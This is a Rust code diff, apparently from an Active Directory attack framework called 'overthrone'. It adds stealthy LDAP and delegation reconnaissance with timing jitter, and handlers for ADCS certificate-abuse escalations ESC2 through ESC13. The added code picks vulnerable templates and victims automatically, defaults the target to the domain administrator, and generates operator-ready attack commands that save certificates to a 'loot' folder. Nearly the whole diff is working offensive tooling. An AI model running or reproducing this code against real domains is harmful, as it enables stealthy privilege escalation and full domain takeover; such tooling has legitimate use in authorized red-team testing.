@@ -134,8 +134,17 @@ pub async fn execute_step(
             | PlannedAction::EnumeratePasswordPolicy
             | PlannedAction::EnumerateDelegations
             | PlannedAction::EnumerateLaps
+            | PlannedAction::StealthLdapProbe
+            | PlannedAction::StealthDelegationProbe
             | PlannedAction::AdcsEnumerate
+            | PlannedAction::AdcsEsc2 { .. }
+            | PlannedAction::AdcsEsc3 { .. }
             | PlannedAction::AdcsEsc4 { .. }
+            | PlannedAction::AdcsEsc5 { .. }
+            | PlannedAction::AdcsEsc7 { .. }
+            | PlannedAction::AdcsEsc9 { .. }
+            | PlannedAction::AdcsEsc10 { .. }
+            | PlannedAction::AdcsEsc13 { .. }
     );
     if requires_ldap && !ctx.ldap_available {
         let msg = format!("Skipped: LDAP service unavailable — {}", step.description);
@@ -166,6 +175,8 @@ pub async fn execute_step(
         PlannedAction::RidCycle { start_rid, end_rid } => {
             exec_rid_cycle(ctx, state, *start_rid, *end_rid).await
         }
+        PlannedAction::StealthLdapProbe => exec_stealth_ldap_probe(ctx, state).await,
+        PlannedAction::StealthDelegationProbe => exec_stealth_delegation_probe(ctx, state).await,
         PlannedAction::AsRepRoast { users } => exec_asrep_roast(ctx, state, users).await,
         PlannedAction::Kerberoast { spns } => exec_kerberoast(ctx, state, spns).await,
         PlannedAction::ConstrainedDelegation {
@@ -213,12 +224,146 @@ pub async fn execute_step(
             ca,
             target_upn,
         } => exec_adcs_esc1(ctx, state, template, ca, target_upn).await,
+        PlannedAction::AdcsEsc2 { template, ca } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC2",
+                &[("template", template.as_str()), ("ca", ca.as_str())],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc3 {
+            agent_template,
+            target_template,
+            ca,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC3",
+                &[
+                    ("agent_template", agent_template.as_str()),
+                    ("target_template", target_template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
         PlannedAction::AdcsEsc4 { template } => exec_adcs_esc4(ctx, state, template).await,
+        PlannedAction::AdcsEsc5 { ca } => {
+            exec_adcs_guided(ctx, state, "ESC5", &[("ca", ca.as_str())]).await
+        }
         PlannedAction::AdcsEsc6 {
             template,
             ca,
             target_upn,
         } => exec_adcs_esc6(ctx, state, template, ca, target_upn).await,
+        PlannedAction::AdcsEsc7 { ca } => {
+            exec_adcs_guided(ctx, state, "ESC7", &[("ca", ca.as_str())]).await
+        }
+        PlannedAction::AdcsEsc8 {
+            ca,
+            template,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC8",
+                &[
+                    ("ca", ca.as_str()),
+                    ("template", template.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc9 {
+            template,
+            ca,
+            victim,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC9",
+                &[
+                    ("template", template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("victim", victim.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc10 {
+            template,
+            ca,
+            victim,
+            target_upn,
+            variant,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC10",
+                &[
+                    ("template", template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("victim", victim.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                    ("variant", variant.as_str()),
+                ],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc11 {
+            ca,
+            template,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC11",
+                &[
+                    ("ca", ca.as_str()),
+                    ("template", template.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc12 { ca_host, ca_name } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC12",
+                &[("ca_host", ca_host.as_str()), ("ca_name", ca_name.as_str())],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc13 {
+            template,
+            ca,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC13",
+                &[
+                    ("template", template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
         PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
             exec_golden_ticket(ctx, state, krbtgt_hash).await
         }
@@ -1612,6 +1757,107 @@ async fn exec_kerberoast(
     }
 }
 
+async fn exec_stealth_ldap_probe(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let domain_entries = conn
+        .custom_search(
+            "(objectClass=domainDNS)",
+            &[
+                "distinguishedName",
+                "ms-DS-MachineAccountQuota",
+                "lockoutThreshold",
+                "minPwdLength",
+            ],
+        )
+        .await
+        .unwrap_or_default();
+    ctx.jitter().await;
+
+    let admin_count = conn
+        .custom_search(
+            "(&(objectCategory=person)(objectClass=user)(adminCount=1))",
+            &["sAMAccountName", "userPrincipalName"],
+        )
+        .await
+        .map(|entries| entries.len())
+        .unwrap_or_default();
+
+    let _ = conn.disconnect().await;
+    let msg = format!(
+        "Stealth LDAP probe: {} domain object(s), {} adminCount user(s); low-volume attrs only",
+        domain_entries.len(),
+        admin_count
+    );
+    state.log_action("Enumerate", "stealth_ldap_probe", &ctx.domain, true, &msg);
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+async fn exec_stealth_delegation_probe(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let constrained = conn
+        .custom_search(
+            "(msDS-AllowedToDelegateTo=*)",
+            &["sAMAccountName", "msDS-AllowedToDelegateTo"],
+        )
+        .await
+        .unwrap_or_default();
+    ctx.jitter().await;
+
+    let unconstrained = conn
+        .custom_search(
+            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
+            &["sAMAccountName", "dNSHostName"],
+        )
+        .await
+        .unwrap_or_default();
+    ctx.jitter().await;
+
+    let rbcd = conn
+        .custom_search(
+            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
+            &["sAMAccountName", "dNSHostName"],
+        )
+        .await
+        .unwrap_or_default();
+
+    let _ = conn.disconnect().await;
+    let msg = format!(
+        "Stealth delegation probe: {} constrained, {} unconstrained, {} RBCD candidates",
+        constrained.len(),
+        unconstrained.len(),
+        rbcd.len()
+    );
+    state.log_action(
+        "Enumerate",
+        "stealth_delegation_probe",
+        &ctx.domain,
+        true,
+        &msg,
+    );
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
 async fn exec_asrep_roast(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -2315,6 +2561,165 @@ async fn exec_adcs_esc6(
             new_credentials: 0,
             new_admin_hosts: 0,
         },
+    }
+}
+
+async fn exec_adcs_guided(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    technique: &str,
+    fields: &[(&str, &str)],
+) -> StepResult {
+    let mut params: HashMap<String, String> = fields
+        .iter()
+        .map(|(key, value)| ((*key).to_string(), (*value).to_string()))
+        .collect();
+
+    let esc_num = technique.trim_start_matches("ESC").parse::<u8>().ok();
+    let mut enum_templates = Vec::new();
+    let mut enum_cas = Vec::new();
+
+    if ctx.ldap_available {
+        if let Ok(conn) = ldap_connect(ctx, state).await {
+            let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
+            enum_templates = enumerator.enumerate_templates().await.unwrap_or_default();
+            enum_cas = enumerator.enumerate_cas().await.unwrap_or_default();
+        }
+    }
+
+    if params.get("ca").is_none_or(|value| value.is_empty()) {
+        if let Some(ca) = enum_cas.first() {
+            params.insert("ca".to_string(), ca.name.clone());
+        }
+    }
+
+    if params.get("ca_host").is_none_or(|value| value.is_empty()) {
+        if let Some(ca) = enum_cas.first() {
+            params.insert("ca_host".to_string(), ca.name.clone());
+        }
+    }
+
+    if params.get("ca_name").is_none_or(|value| value.is_empty()) {
+        if let Some(ca) = enum_cas.first() {
+            params.insert("ca_name".to_string(), ca.name.clone());
+        }
+    }
+
+    for key in ["template", "agent_template", "target_template"] {
+        if params.get(key).is_some_and(|value| !value.is_empty()) {
+            continue;
+        }
+        let preferred = esc_num
+            .and_then(|num| {
+                enum_templates
+                    .iter()
+                    .find(|template| template.esc_vulnerability() == Some(num))
+            })
+            .or_else(|| enum_templates.first());
+        if let Some(template) = preferred {
+            params.insert(key.to_string(), template.name.clone());
+        }
+    }
+
+    if params
+        .get("target_upn")
+        .is_none_or(|value| value.is_empty())
+    {
+        params.insert(
+            "target_upn".to_string(),
+            format!("administrator@{}", ctx.domain),
+        );
+    }
+
+    if params.get("victim").is_none_or(|value| value.is_empty()) {
+        if let Some(user) = state
+            .users
+            .iter()
+            .find(|user| user.enabled && !user.admin_count)
+        {
+            params.insert("victim".to_string(), user.sam_account_name.clone());
+        }
+    }
+
+    if params.get("variant").is_none_or(|value| value.is_empty()) {
+        params.insert("variant".to_string(), "a".to_string());
+    }
+
+    let command = adcs_command_hint(technique, &params, ctx);
+    let summary = format!(
+        "{technique}: prepared operator-ready ADCS path with {} template(s), {} CA(s). Command: {}",
+        enum_templates.len(),
+        enum_cas.len(),
+        command
+    );
+    info!("{} {}", "  i".cyan(), summary);
+    state.log_action("Attack", technique, "", true, &summary);
+
+    StepResult {
+        success: true,
+        output: summary,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+fn param<'a>(params: &'a HashMap<String, String>, key: &str, fallback: &'a str) -> &'a str {
+    params
+        .get(key)
+        .filter(|value| !value.is_empty())
+        .map(String::as_str)
+        .unwrap_or(fallback)
+}
+
+fn adcs_command_hint(
+    technique: &str,
+    params: &HashMap<String, String>,
+    ctx: &ExecContext,
+) -> String {
+    let default_target_upn = format!("administrator@{}", ctx.domain);
+    let ca = param(params, "ca", "<ca>");
+    let ca_host = param(params, "ca_host", ca);
+    let ca_name = param(params, "ca_name", ca);
+    let template = param(params, "template", "<template>");
+    let agent_template = param(params, "agent_template", template);
+    let target_template = param(params, "target_template", template);
+    let target_upn = param(params, "target_upn", &default_target_upn);
+    let victim = param(params, "victim", "<victim>");
+    let variant = param(params, "variant", "a");
+    match technique {
+        "ESC2" => format!(
+            "overthrone adcs esc2 --ca {ca} --template {template} --output loot/esc2_{target_upn}.pfx"
+        ),
+        "ESC3" => format!(
+            "overthrone adcs esc3 --ca {ca} --agent-template {agent_template} --target-template {target_template} --target-user {target_upn}"
+        ),
+        "ESC5" => format!("overthrone adcs esc5 --ca {ca}"),
+        "ESC7" => format!("overthrone adcs esc7 --ca {ca}"),
+        "ESC8" => {
+            format!("overthrone adcs esc8 --url http://{ca}/certsrv/ --target-user {target_upn}")
+        }
+        "ESC9" => format!(
+            "overthrone adcs esc9 --ca {ca} --template {template} --target-upn {target_upn} --victim {victim} --original-upn {victim}@{domain} --ldap-url ldap://{dc}",
+            domain = ctx.domain,
+            dc = ctx.dc_ip
+        ),
+        "ESC10" => format!(
+            "overthrone adcs esc10 --ca {ca} --template {template} --target-upn {target_upn} --variant {variant} --victim {victim}"
+        ),
+        "ESC11" => format!(
+            "overthrone adcs esc11 --ca-host {ca_host} --ca-name {ca_name} --template {template}"
+        ),
+        "ESC12" => format!(
+            "overthrone adcs esc12 --ca-host {ca_host} --ca-name {ca_name} --operator {}",
+            ctx.username
+        ),
+        "ESC13" => format!(
+            "overthrone adcs esc13 --ca {ca} --template {template} --policy-oid <linked-policy-oid> --linked-group-dn <linked-group-dn> --subject {target_upn}"
+        ),
+        _ => format!(
+            "overthrone adcs {} --ca {ca} --template {template}",
+            technique.to_ascii_lowercase()
+        ),
     }
 }
 
